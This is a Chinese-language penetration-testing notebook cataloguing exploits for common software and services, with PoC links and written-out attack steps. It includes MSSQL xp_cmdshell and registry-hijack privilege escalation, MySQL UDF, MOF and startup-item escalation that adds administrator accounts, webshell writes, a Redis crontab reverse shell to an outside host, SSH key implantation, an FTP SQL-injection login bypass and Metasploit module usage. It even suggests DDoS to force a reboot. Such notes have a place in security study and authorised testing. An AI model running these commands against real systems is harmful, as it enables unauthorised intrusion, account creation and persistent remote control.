# 业务软件 vul 整合笔记

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

# 本地
## Andorid
### ESFileExplorers
**CVE-2019-6447**
- POC | Payload | exp
    - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

---

## Linux

### Logwatch
**CVE-2011-1018 Logwatch logwatch.pl 任意命令执行漏洞**
- POC | Payload | exp
    - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)

### KDE
**KDE 4/5 KDesktopFile Command Injection**
- POC | Payload | exp
    - [KDE 4/5 KDesktopFile Command Injection](https://gist.githubusercontent.com/zeropwn/630832df151029cb8f22d5b6b9efaefb/raw/64aa3d30279acb207f787ce9c135eefd5e52643b/kde-kdesktopfile-command-injection.txt)

### vim
**CVE-2019-12735 Vim/Neovim Arbitrary Code Execution via Modelines**
- POC | Payload | exp
    - [2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)

### Supervisor
**测试链接**
- `http://<ip>:9001`

---

## Windows

### Evernote
**Evernote 7.9**
- 文章
    - [Code execution – Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)

### Firefox
**CVE-2019-9810**
- POC | Payload | exp
    - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)

### IE
**XML External Entity Injection**
- POC | Payload | exp
    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt

**CVE-2018-8174**
- POC | Payload | exp
    - [Yt1g3r/CVE-2018-8174_EXP: CVE-2018-8174_python](https://github.com/Yt1g3r/CVE-2018-8174_EXP)
    - [0x09AL/CVE-2018-8174-msf: CVE-2018-8174 - VBScript memory corruption exploit.](https://github.com/0x09AL/CVE-2018-8174-msf)

### Office
**CVE-2017-0199**
- [bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

**CVE-2017-8759**
- [Lz1y/CVE-2017-8759](https://github.com/Lz1y/CVE-2017-8759)

**CVE-2017-11882**
- POC | Payload | exp
    - [Ridter/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)
    - [embedi/CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)

### WinRAR
**CVE-2018-20250**
- 文章
    - [Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

- POC | Payload | exp
    - [WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250)

---

## Mac
### zoom
- POC | Payload | exp
    - [JLLeitschuh/zoom_vulnerability_poc](https://github.com/JLLeitschuh/zoom_vulnerability_poc)

---

# 对外
## 分布式
### Hadoop
**文章**
- [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
- [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)

**Hadoop 未授权访问**
- 示例
    ```
    curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
    http://<ip>:50070
    http://<ip>:50070/dfshealth.jsp
    http://<ip>:50070/logs/
    ```

### ZooKeeper
**ZooKeeper 未授权访问漏洞**
- 文章
    - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
    - [攻击大数据应用：ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)

- 搭建环境
    ```bash
    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
    tar -zxvf zookeeper-3.4.14.tar.gz
    cd zookeeper-3.4.14/
    cd conf/
    ```
    ```vim
    vim zoo.cfg  # 配置单机模式

    tickTime=2000
    dataDir=/tmp/zookeeper/data
    dataLogDir=/tmp/zookeeper/logs
    clientPort=2181
    ```
    ```bash
    cd ..
    bin/zkServer.sh start   # 启动
    bin/zkCli.sh -server 127.0.0.1:2181 #连接 server
    ```

- 利用
    ```bash
    echo envi|nc <ip> 2181 # 打印有关服务环境的详细信息
    echo dump |ncat <ip> 2181 # 列出未完成的会话和临时节点
    echo reqs |ncat <ip> 2181 # 列出未完成的请求
    echo ruok |ncat <ip> 2181 # 测试服务器是否运行在非错误状态
    echo stat |ncat <ip> 2181 # 列出关于性能和连接的客户端的统计信息

    ./zkCli.sh -server <ip>:port
    ```

**CVE-2014-085 ZooKeeper 信息泄露漏洞**
- 文章
    - [ZooKeeper信息泄露漏洞(CVE-2014-085)](https://blog.csdn.net/u011721501/article/details/44062617)

---

## 数据库
### memcached
**未授权访问漏洞**
- POC | Payload | exp

    `telnet <ip> 11211`

    `nc -vv <ip> 11211`

### MS SQL Server
**文章**
- [从攻击MS SQL Server到获得系统访问权限](https://www.freebuf.com/articles/database/22997.html)

**提权**
- **SA 提权**
    1. 判断扩展存储是否存在：
        ```
        select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'
        select count(*) from master.dbo.sysobjects where name='xp_regread'
        恢复：
        exec sp_dropextendedproc 'xp_cmdshell'
        exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'
        EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005)
        ```

    2. 列目录：
        ```
        exec master..xp_cmdshell 'ver'
        (or) exec master..xp_dirtree 'c:\',1,1
        (or) drop table black
        create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--
        insert into black exec master..xp_cmdshell 'dir c:\'
        select top 1 mulu from black where id=1
        xp_cmdshell 被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权
        ```

    3. 备份启动项：
        ```
        alter database [master] set RECOVERY FULL
        create table cmd (a image)
        backup log [master] to disk = 'c:\cmd1' with init
        insert into cmd (a) values (0x(batcode))
        backup log [master] to disk = 'C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat'
        drop table cmd
        ```

    4. 映像劫持

        `xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'`

    5. 沙盒模式提权：

        a：`exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet.0\Engines','SandBoxMode','REG_DWORD',0;` # 关闭沙盒模式

        b：`Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user mstlab mstlab /add")');` #or c:\windows\system32\ias\dnary.mdb string 类型用此。
        开启 OpenRowSet：`exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;`

    6. xp_regwrite 操作注册表

        `exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion un','black','REG_SZ','net user test test /add'`

        开启 xp_oacreate : exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;

### mysql
**提权**
- **文章**
    - [Windows下三种mysql提权剖析](https://xz.aliyun.com/t/2719)

- **通过 phpmyadmin 来 getshell**
    - 确认绝对路径

        利用 log 变量，猜绝对路径

        ![image](../../../assets/img/渗透/笔记/业务软件vul整合笔记/1.png)

        或者直接查询 `select @@basedir;`

        直接 SQL 写文件
        `select '<?php phpinfo(); ?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/a.php';`
        如果 file_priv 为 null，那么是写不了的，可以尝试使用日志写马
        ```sql
        set global general_log='on';
        set global general_log_file='C:/phpStudy/PHPTutorial/WWW/a.php';
        select '<?php phpinfo(); ?>';
        set global general_log=off;
        ```

- **UDF 提权**
    - 文章
        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

    - POC | Payload | exp
        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

    - 手工
        ```sql
        select @@basedir;  # 查看 mysql 安装目录
        select 'It is dll' into dumpfile 'C:\。。lib::';  # 利用 NTFS ADS 创建 lib 目录
        select 'It is dll' into dumpfile 'C:\。。lib\plugin::';  # 利用NTFS ADS 创建 plugin 目录
        select 0xUDFcode into dumpfile 'C:\phpstudy\MySQL\lib\plugin\mstlab.dll';  # 导出 udfcode，注意修改 udfcode
        create function cmdshell returns string soname 'mstlab.dll';   #用 udf 创建 cmd 函数，shell,sys_exec,sys_eval
        select shell('cmd','net user');     # 执行 cmd 命令
        show variables like '%plugin%';     # 查看 plugin 路径
        ```

        小技巧：

        1. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中 ImagePath 的值为 mysql 安装目录
        2. my.ini 中 datadir 的值是数据存放目录
        3. UPDATE user set File_priv ='Y';  flush privileges; 强制加 file权限

        ```sql
        USE mysql;
        CREATE TABLE npn(line blob);
        INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
        SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
        CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
        SELECT sys_exec("net user npn npn12345678 /add");
        SELECT sys_exec("net localgroup Administrators npn /add");
        ```

- **MOF 提权**

    MOF提权的条件要求十分严苛：
    1. windows 03 及以下版本
    2. mysql 启动身份具有权限去读写 c:/windows/system32/wbem/mof 目录
    3. secure-file-priv 参数不为 null

    ```ini
    #pragma namespace("\\.\root\subscription")

    instance of __EventFilter as
    {
        EventNamespace = "Root\Cimv2";
        Name  = "filtP2";
        Query = "Select * From __InstanceModificationEvent "
                "Where TargetInstance Isa \"Win32_LocalTime\" "
                "And TargetInstance.Second = 5";
        QueryLanguage = "WQL";
    };

    instance of ActiveScriptEventConsumer as
    {
        Name = "consPCSV2";
        ScriptingEngine = "JScript";
        ScriptText =
        "var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"net.exe user sqladmin admin /add&&net.exe localgroup administrators sqladmin /add\")";
    };

    instance of __FilterToConsumerBinding
    {
        Consumer   = ;
        Filter = ;
    };
    ```
    1. 保存为 1.mof,然后 mysql 执行：`select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';`
    2. mof 被执行的话，会帮我们添加一个叫 sqladmin 的用户。

    **关于 Mof 提权的弊端**

    我们提权成功后，就算被删号，mof 也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？
    ```
    net stop winmgmt
    del c:/windows/system32/wbem/repository
    net start winmgmt
    ```

- **启动项提权**

    在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和 mof 几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用 mysql 写文件，写入一段 VBS 代码到开机自启动中，服务器重启达到创建用户并提权，可以使用 DDOS 迫使服务器重启。

    提权条件
    1. file_priv 不为 null
    2. 已知 root 密码

    ```sql
    create table a (cmd text);
    insert into a values ("set wshshell=createobject (""wscript.shell"") " );
    insert into a values ("a=wshshell.run (""cmd.exe /c net user sqladmin 123456 /add"",0) " );
    insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators sqladmin /add"",0) " );
    select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
    ```

### oracle
**工具**
- [jas502n/oracleShell](https://github.com/jas502n/oracleShell) - oracle 数据库命令执行

**CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP 代码执行漏洞**
- MSF 模块
    ```bash
    use exploit/windows/oracle/client_system_analyzer_upload
    ```

**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
- 文章
    - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)

- MSF 模块
    ```bash
    use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到 oracle 的内存信息,若是能获取到内存中的数据即为存在漏洞。
    set rhosts <ip>
    run

    use auxiliary/admin/oracle/sid_brute  # 爆破 oracle 的 SID
    set rhosts <ip>
    run
    ```

**CVE-2012-5615 Oracle MySQL Server 5.5.19 用户名枚举漏洞**
- POC | Payload | exp
    - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
    - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)

### OrientDB
**CVE-2017-11467**
- 文章
    - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)

- POC | Payload | exp
    - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)

### redis
**未授权访问漏洞**
- 文章
    - [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
    - [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
    - [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
    - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)

- 搭建环境
    ```bash
    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
    tar xzf redis-3.2.0.tar.gz
    cd redis-3.2.0
    make
    ```
    ```vim
    vim redis.conf

    # bind 127.0.0.1
    protected-mode no
    ```
    ```
    ./src/redis-server redis.conf
    ```

- 利用
    ```sql
    redis-cli -h <目标IP>
    >info   # 查看redis版本信息、一些具体信息、服务器版本信息等等：
    >CONFIG GET dir # 获取默认的redis目录
    >CONFIG GET dbfilename # 获取默认的 rdb 文件名
    ```

    **利用计划任务执行命令反弹 shell**

    在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 7999` 然后执行命令:
    ```bash
    > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
    > config set dir /var/spool/cron/
    > config set dbfilename root
    > save
    ```

    **写 ssh-keygen 公钥然后使用私钥登陆**

    在以下条件下，可以利用此方法
    1. Redis 服务使用 ROOT 账号启动
    2. 服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

    首先在本地生成一对密钥 `ssh-keygen -t rsa` 然后执行命令:
    ```bash
    将公钥的内容写到一个文本中命令如下
    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt

    将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下
    cat test.txt | redis -cli -h <hostname> -x set test
    redis-cli -h <hostname>
    keys *
    get test
    config set dir "/root/.ssh"
    config set dbfilename "authorized_keys"
    save
    ```
    保存后可以直接利用公钥登录 ssh

    **往 web 物理路径写 webshell**

    当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell
    执行以下命令
    ```bash
    > config set dir /var/www/html/
    > config set dbfilename shell.php
    > set x "<?php phpinfo();?>"
    > save
    ```
    即可将 shell 写入 web 目录(web 目录根据实际情况)

**Redis 4.x 5.x RCE**
- 搭建环境
    ```bash
    yum install tcl
    wget download.redis.io/releases/redis-4.0.11.tar.gz
    tar zxf redis-4.0.11.tar.gz
    cd redis-4.0.11
    make PREFIX=/usr/local/redis install

    /usr/local/redis/bin/redis-server

    参考 https://mp.weixin.qq.com/s/MSWLqzyNnliX1G7TRYAwVw
    ```

- POC | Payload | exp
    - [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
    - [Ridter/redis-rce](https://github.com/Ridter/redis-rce)

---

## 文件服务
### ftp
**Xlight FTP Server < 3.2.1 user 参数 SQL 注入漏洞**
- 简介

    在执行 ODBC 认证过程中 Xlight FTP Server 没有正确地过滤用户所提交的用户名和口令字段，远程攻击者可以用“OR ‘1’=’1’ ;#”替换用户名绕过认证登录到服务器。

- 示例
    ```bash
    220 Xlight FTP Server 3.2 ready...
    User (server-4:(none)) : \' OR \'1\'=\'1\' ;#
    331 Password required for \' OR \'1\'=\'1\' ;#
    Password : type anything
    230 Login OK
    ftp&gt;
    ```

**Serv-U FTP Server 目录遍历漏洞**
- 文章
    - [Serv-U FTP Server 0day漏洞分析报告](http://safe.it168.com/a2011/1213/1287/000001287577.shtml)

- 示例
    ```bash
    ls ../windwos
        550 .....

    ls ..:/windows
        150 ....
        ...
        ...
    ```

### nfs
**CVE-1999-0554 目标主机 showmount -e 信息泄露**
- 示例
    ```
    showmount -e xxx.xxx.xxx.xxx
    mount -t nfs xxx.xxx.xxx.xxx:/opt/applications/xxx_static_data  /mnt
    ```

- MSF 模块
    ```bash
    use auxiliary/scanner/nfs/nfsmount
    set rhosts <ip>
    run
    ```

### Rsync
**未授权访问**
- 文章
    - [rsync的几则tips(渗透技巧)](http://www.91ri.org/11093.html)
    - [配置漏洞之Rsync匿名访问](https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html)

- 示例

    `rsync <目标IP>::`

- MSF 模块
    ```bash
    use auxiliary/scanner/rsync/modules_list
    set rhosts <ip>
    run
    ```

### samba
**CVE-2015-0240**
- 文章
    - [Samba CVE-2015-0240 远程代码执行漏洞利用实践](https://www.secpulse.com/archives/5975.html)

- MSF 模块
    ```bash
    use auxiliary/scanner/smb/smb_uninit_cred
    set rhosts <ip>
    run
    ```

**CVE-2017-7494**
- 文章
    - [Linux cve-2017-7494samba远程漏洞利用和分析](https://bbs.pediy.com/thread-218114.htm)

- POC | Payload | exp
    - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
    - [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)

- MSF 模块
    ```bash
    use exploit/linux/samba/is_known_pipename
    set rhost <ip>
    set target 3
    run
    ```

---

## 远程服务

### Java RMI
**JAVA RMI 反序列化远程命令执行漏洞**

鸽

### OpenSSH
**CVE-2018-15473 OpenSSH 用户枚举漏洞**
- 影响范围
    - OpenSSH 7.7及其以前版本

- 文章
    - [OpenSSH用户枚举漏洞(CVE-2018-15473)分析](https://www.anquanke.com/post/id/157607)
    - [SSH用户枚举漏洞(CVE-2018-15473)原理学习](https://www.cnblogs.com/KevinGeorge/p/9530835.html)

- POC | Payload | exp
    - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
    - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)

- MSF 模块
    ```bash
    use auxiliary/scanner/ssh/ssh_enumusers
    set rhosts <ip>
    set USER_FILE <aaa.txt>
    run
    ```

### VNC
**未授权访问漏洞**
- MSF 模块
    ```bash
    use auxiliary/scanner/vnc/vnx_none_auth
    set rhosts <ip>
    set threads 50
    run
    ```

---

## 虚拟化
### Docker
**未授权访问漏洞**

- `http://<ip>:2375/version`
